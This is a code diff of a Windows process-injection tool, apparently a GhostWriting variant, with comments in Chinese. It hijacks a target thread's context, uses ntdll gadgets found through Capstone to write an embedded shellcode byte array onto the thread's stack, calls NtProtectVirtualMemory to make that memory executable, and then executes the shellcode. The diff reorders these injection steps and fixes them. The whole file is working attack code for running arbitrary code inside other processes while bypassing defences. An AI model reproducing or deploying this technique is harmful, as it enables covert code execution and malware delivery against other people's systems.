@@ -6,8 +6,12 @@
 #pragma comment(lib, "capstone.lib")
 
 
-INT Start = 0x0; // Shellcode入口偏移
+INT EntryPoint = 0x10; // Shellcode入口偏移
+
 BYTE Shellcode[] = {
+	// 生成的shellcode有bug，会对[rsp+8]地址进行写入操作，为了避免数据被破坏，只能额外加一排全0数据
+	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+
 	0x48,0x89,0x5c,0x24,0x08,0x57,0x48,0x83,0xec,0x20,0x65,0x48,0x8b,0x04,0x25,0x30,
 	0x00,0x00,0x00,0x41,0xb9,0xdf,0xff,0x00,0x00,0x48,0x8b,0x48,0x60,0x48,0x8b,0x41,
 	0x18,0x4c,0x8b,0x40,0x20,0x49,0x8b,0xd0,0x48,0x8b,0x12,0x48,0x8b,0x4a,0x40,0x0f,
@@ -45,8 +49,8 @@ BYTE Shellcode[] = {
 struct GW {
 	enum REG { Rbx, Rsi, Rdi };
 
-	REG DREG; // 目的寄存器
-	REG SREG; // 源寄存器
+	REG OPL; // 目的寄存器
+	REG OPR; // 源寄存器
 
 	PVOID JMPTOSELFAddress;
 	PVOID MOVRETAddress;
@@ -133,13 +137,13 @@ BOOL FindMOVRETAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
 				switch (opr->reg)
 				{
 				case X86_REG_RBX:
-					Ghost->SREG = GW::Rbx;
+					Ghost->OPR = GW::Rbx;
 					break;
 				case X86_REG_RSI:
-					Ghost->SREG = GW::Rsi;
+					Ghost->OPR = GW::Rsi;
 					break;
 				case X86_REG_RDI:
-					Ghost->SREG = GW::Rdi;
+					Ghost->OPR = GW::Rdi;
 					break;
 				}
 
@@ -147,13 +151,13 @@ BOOL FindMOVRETAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
 				switch (opl->mem.base)
 				{
 				case X86_REG_RBX:
-					Ghost->DREG = GW::Rbx;
+					Ghost->OPL = GW::Rbx;
 					break;
 				case X86_REG_RSI:
-					Ghost->DREG = GW::Rsi;
+					Ghost->OPL = GW::Rsi;
 					break;
 				case X86_REG_RDI:
-					Ghost->DREG = GW::Rdi;
+					Ghost->OPL = GW::Rdi;
 					break;
 				}
 
@@ -270,91 +274,96 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 	ThreadContext.ContextFlags = CONTEXT_FULL;
 	GetThreadContext(Thread, &ThreadContext);
 
-	// 设置源寄存器
-	DWORD64* SREG;
+	// 设置右操作数
+	DWORD64* OPR;
 
-	switch (Ghost->SREG)
+	switch (Ghost->OPR)
 	{
 	case GW::Rbx:
-		SREG = &ThreadContext.Rbx;
+		OPR = &ThreadContext.Rbx;
 		break;
 	case GW::Rsi:
-		SREG = &ThreadContext.Rsi;
+		OPR = &ThreadContext.Rsi;
 		break;
 	case GW::Rdi:
-		SREG = &ThreadContext.Rdi;
+		OPR = &ThreadContext.Rdi;
 		break;
 	default:
-		SREG = NULL;
+		OPR = NULL;
 		break;
 	}
 
-	if (SREG == NULL) {
-		_tprintf(_T("[x] Unsupported source register: %d\n"), Ghost->SREG);
+	if (OPR == NULL) {
+		_tprintf(_T("[x] Unsupported source register: %d\n"), Ghost->OPR);
 		return FALSE;
 	}
 
-	// 设置目的寄存器
-	DWORD64* DREG;
+	// 设置左操作数
+	DWORD64* OPL;
 
-	switch (Ghost->DREG)
+	switch (Ghost->OPL)
 	{
 	case GW::Rbx:
-		DREG = &ThreadContext.Rbx;
+		OPL = &ThreadContext.Rbx;
 		break;
 	case GW::Rsi:
-		DREG = &ThreadContext.Rsi;
+		OPL = &ThreadContext.Rsi;
 		break;
 	case GW::Rdi:
-		DREG = &ThreadContext.Rdi;
+		OPL = &ThreadContext.Rdi;
 		break;
 	default:
-		DREG = NULL;
+		OPL = NULL;
 		break;
 	}
 
-	if (DREG == NULL) {
-		_tprintf(_T("[x] Unsupported destination register: %d\n"), Ghost->DREG);
+	if (OPL == NULL) {
+		_tprintf(_T("[x] Unsupported destination register: %d\n"), Ghost->OPL);
 		return FALSE;
 	}
 
 	//
-	// 计算RSP预留空间
+	// 计算栈空间大小
 	//
-
-	// 预留Shellcode空间
-	INT BytesOfShellcode = sizeof(Shellcode);
-	BytesOfShellcode = BytesOfShellcode - (BytesOfShellcode % sizeof(PVOID)) + sizeof(PVOID); // 取 sizeof(PVOID) 的整数倍值
-
-	// 预留NtProtectVirtualMemory参数空间
-	INT BytesOfNtProtectVirtualMemoryCallFrame = (1 + 5 + 3) * sizeof(PVOID);
 
 	// 预留JMPTOSELFAddress地址空间
 	INT BytesOfJmpToSelfAddress = sizeof(PVOID);
 
-	// 计算RSP栈顶位置
+	// 预留NtProtectVirtualMemory参数空间
+	INT BytesOfNtProtectVirtualMemoryCallFrame = (5 + 3) * sizeof(PVOID);
+
+	// 预留Shellcode空间
+	INT BytesOfShellcode = sizeof(Shellcode);
+
+	// Shellcode和NtProtectVirtualMemory调用帧栈共用一块内存，所以取两者最大值
+	if (BytesOfShellcode < BytesOfNtProtectVirtualMemoryCallFrame)
+		BytesOfShellcode = BytesOfNtProtectVirtualMemoryCallFrame;
+
+	// 取 sizeof(PVOID) 的整数倍值
+	BytesOfShellcode = BytesOfShellcode - (BytesOfShellcode % sizeof(PVOID)) + sizeof(PVOID);
+
+	// 计算RSP栈顶位置，这里的栈顶包含了RSP和POP补偿偏移
 	DWORD64 StackTopAddress = ThreadContext.Rsp
-		- BytesOfShellcode
-		- BytesOfNtProtectVirtualMemoryCallFrame
 		- BytesOfJmpToSelfAddress
+		- BytesOfShellcode
 		- Ghost->RspCompensation				// 补偿RSP
 		- (Ghost->PopCount * sizeof(PVOID));	// 补偿POP
 
-	// 栈对齐
-	StackTopAddress = StackTopAddress - (StackTopAddress % 16) - 16;
+	// 栈内存16字节对齐
+	StackTopAddress = StackTopAddress - (StackTopAddress % 16);
 
 	//
-	// RSP顶端写入JMPTOSELFAddress地址
+	// 第一步：RSP顶端写入JMPTOSELFAddress地址
 	//
 
 	// 重置RSP
 	ThreadContext.Rsp = StackTopAddress;
 
 	// 源寄存器储存将要写入的数据
-	*SREG = (DWORD64)Ghost->JMPTOSELFAddress;
+	*OPR = (DWORD64)Ghost->JMPTOSELFAddress;
 
 	// 目的寄存器储存将要写入的地址
-	*DREG = ThreadContext.Rsp
+	*OPL = ThreadContext.Rsp
 		+ Ghost->RspCompensation				// 平衡RSP的补偿
 		+ (Ghost->PopCount * sizeof(PVOID))		// 平衡POP的补偿
 		- Ghost->Displacement;					// 修正MOV指令中的位移地址
@@ -367,36 +376,34 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 		return FALSE;
 
 	//
-	// 写入NtProtectVirtualMemory参数
+	// 第二步：写入NtProtectVirtualMemory参数
 	//
 
 	// 重置RSP
 	ThreadContext.Rsp = StackTopAddress;
 
 	// 这是个fastcall调用约定的函数，传参顺序 RCX RDX R8 R9，OldAccessProtection参数使用压栈传递
-	// 
-	//NTSTATUS NtProtectVirtualMemory(
-	//	HANDLE ProcessHandle,
-	//	PVOID *BaseAddress,
-	//	SIZE_T *NumberOfBytesToProtect,
-	//	ULONG NewAccessProtection,
-	//	PULONG OldAccessProtection)
+	 
+	// NTSTATUS NtProtectVirtualMemory(
+	//		HANDLE ProcessHandle,
+	//		PVOID* BaseAddress,
+	//		SIZE_T* NumberOfBytesToProtect,
+	//		ULONG NewAccessProtection,
+	//		PULONG OldAccessProtection);
 
-	DWORD64 NtProtectVirtualMemoryCallFrame[1 + 5 + 3] = { // 这里 1+5+3 如果有改动，前面的BytesOfNtProtectVirtualMemoryCallFrame别忘了改掉
+	DWORD64 NtProtectVirtualMemoryCallFrame[5 + 3] = { // 这里 5+3 如果有改动，前面的BytesOfNtProtectVirtualMemoryCallFrame别忘了改掉
 
-		(DWORD64)Ghost->JMPTOSELFAddress,	// 栈帧：返回地址
-		
 		(DWORD64)-1,						// 栈帧：参数 ProcessHandle
 
 		ThreadContext.Rsp					// 栈帧：参数 *BaseAddress，注意这是一个二级指针，指向临时指针 BaseAddress
 			+ BytesOfJmpToSelfAddress
-			+ ((1 + 5 + 0) * sizeof(PVOID))
+			+ ((5 + 0) * sizeof(PVOID))
 			+ Ghost->RspCompensation
 			+ (Ghost->PopCount * sizeof(PVOID)),
 		
 		ThreadContext.Rsp					// 栈帧：参数 NumberOfBytesToProtect，注意这是一个指针，指向临时变量 NumberOfBytesToProtect
 			+ BytesOfJmpToSelfAddress
-			+ ((1 + 5 + 1) * sizeof(PVOID))
+			+ ((5 + 1) * sizeof(PVOID))
 			+ Ghost->RspCompensation
 			+ (Ghost->PopCount * sizeof(PVOID)),
 		
@@ -404,13 +411,12 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 
 		ThreadContext.Rsp					// 栈帧：参数 OldAccessProtection，注意这是一个指针，指向临时变量 OldAccessProtection
 			+ BytesOfJmpToSelfAddress
-			+ ((1 + 5 + 2) * sizeof(PVOID))
+			+ ((5 + 2) * sizeof(PVOID))
 			+ Ghost->RspCompensation
 			+ (Ghost->PopCount * sizeof(PVOID)),
 
 		ThreadContext.Rsp					// 临时指针 BaseAddress：指向Shellcode区域
 			+ BytesOfJmpToSelfAddress
-			+ BytesOfNtProtectVirtualMemoryCallFrame
 			+ Ghost->RspCompensation
 			+ (Ghost->PopCount * sizeof(PVOID)),
 		
@@ -425,10 +431,10 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 		ThreadContext.Rsp = StackTopAddress;
 
 		// 源寄存器储存将要写入的数据
-		*SREG = NtProtectVirtualMemoryCallFrame[i];
+		*OPR = NtProtectVirtualMemoryCallFrame[i];
 
 		// 目的寄存器储存将要写入的地址
-		*DREG = ThreadContext.Rsp
+		*OPL = ThreadContext.Rsp
 			+ BytesOfJmpToSelfAddress
 			+ i * sizeof(PVOID)
 			+ Ghost->RspCompensation				// 平衡RSP的补偿
@@ -444,56 +450,26 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 	}
 
 	//
-	// 写入Shellcode
+	// 第三步：执行NtProtectVirtualMemory
 	//
 
-	for (int i = 0; i < BytesOfShellcode / sizeof(PVOID); i++) {
+	// fastcall参数设置 栈帧：参数 ProcessHandle
+	ThreadContext.Rcx = NtProtectVirtualMemoryCallFrame[0];
 
-		// 重置RSP
-		ThreadContext.Rsp = StackTopAddress;
+	// fastcall参数设置 栈帧：参数 *BaseAddress，注意这是一个二级指针，指向临时指针 BaseAddress
+	ThreadContext.Rdx = NtProtectVirtualMemoryCallFrame[1];
 
-		// 源寄存器储存将要写入的数据
-		*SREG = ((DWORD64*)Shellcode)[i];
+	// fastcall参数设置 栈帧：参数 NumberOfBytesToProtect，注意这是一个指针，指向临时变量 NumberOfBytesToProtect
+	ThreadContext.R8 = NtProtectVirtualMemoryCallFrame[2];
 
-		// 目的寄存器储存将要写入的地址
-		*DREG = ThreadContext.Rsp
-			+ BytesOfJmpToSelfAddress
-			+ BytesOfNtProtectVirtualMemoryCallFrame
-			+ i * sizeof(PVOID)
-			+ Ghost->RspCompensation				// 平衡RSP的补偿
-			+ (Ghost->PopCount * sizeof(PVOID))		// 平衡POP的补偿
-			- Ghost->Displacement;					// 修正MOV指令中的位移地址
-
-		// RIP指向MOVRETAddress
-		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;
-
-		// 写入数据
-		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
-			return FALSE;
-	}
-
-	//
-	// 执行NtProtectVirtualMemory
-	//
+	// fastcall参数设置 栈帧：参数 NewAccessProtection
+	ThreadContext.R9 = NtProtectVirtualMemoryCallFrame[3];
 
 	// 重置RSP
 	ThreadContext.Rsp = StackTopAddress;
 
-	// 栈帧：参数 ProcessHandle
-	ThreadContext.Rcx = NtProtectVirtualMemoryCallFrame[1];
-
-	// 栈帧：参数 *BaseAddress，注意这是一个二级指针，指向临时指针 BaseAddress
-	ThreadContext.Rdx = NtProtectVirtualMemoryCallFrame[2];
-
-	// 栈帧：参数 NumberOfBytesToProtect，注意这是一个指针，指向临时变量 NumberOfBytesToProtect
-	ThreadContext.R8 = NtProtectVirtualMemoryCallFrame[3];
-
-	// 栈帧：参数 NewAccessProtection
-	ThreadContext.R9 = NtProtectVirtualMemoryCallFrame[4];
-
-	// RSP指向NtProtectVirtualMemoryCallFrame
+	// 将RSP对准JMPTOSELFAddress
 	ThreadContext.Rsp = ThreadContext.Rsp
-		+ BytesOfJmpToSelfAddress
 		+ Ghost->RspCompensation				// 平衡RSP的补偿
 		+ (Ghost->PopCount * sizeof(PVOID));	// 平衡POP的补偿
 
@@ -505,7 +481,35 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 		return FALSE;
 
 	//
-	// 执行Shellcode
+	// 第四步：写入Shellcode
+	//
+
+	for (int i = 0; i < BytesOfShellcode / sizeof(PVOID); i++) {
+
+		// 重置RSP
+		ThreadContext.Rsp = StackTopAddress;
+
+		// 源寄存器储存将要写入的数据
+		*OPR = ((DWORD64*)Shellcode)[i];
+
+		// 目的寄存器储存将要写入的地址
+		*OPL = ThreadContext.Rsp
+			+ BytesOfJmpToSelfAddress
+			+ i * sizeof(PVOID)
+			+ Ghost->RspCompensation				// 平衡RSP的补偿
+			+ (Ghost->PopCount * sizeof(PVOID))		// 平衡POP的补偿
+			- Ghost->Displacement;					// 修正MOV指令中的位移地址
+
+		// RIP指向MOVRETAddress
+		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;
+
+		// 写入数据
+		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
+			return FALSE;
+	}
+
+	//
+	// 第五步：执行Shellcode
 	//
 
 	// 重置RSP
@@ -513,13 +517,12 @@ BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
 
 	// RIP指向Shellcode
 	ThreadContext.Rip = ThreadContext.Rsp
-		+ BytesOfNtProtectVirtualMemoryCallFrame
 		+ BytesOfJmpToSelfAddress
-		+ Start									// Shellcode入口偏移
+		+ EntryPoint							// Shellcode入口偏移
 		+ Ghost->RspCompensation				// 平衡RSP的补偿
 		+ (Ghost->PopCount * sizeof(PVOID));	// 平衡POP的补偿
 
-	// RSP指向JMPTOSELFAddress
+	// 将RSP对准JMPTOSELFAddress
 	ThreadContext.Rsp = ThreadContext.Rsp
 		+ Ghost->RspCompensation				// 平衡RSP的补偿
 		+ (Ghost->PopCount * sizeof(PVOID));	// 平衡POP的补偿
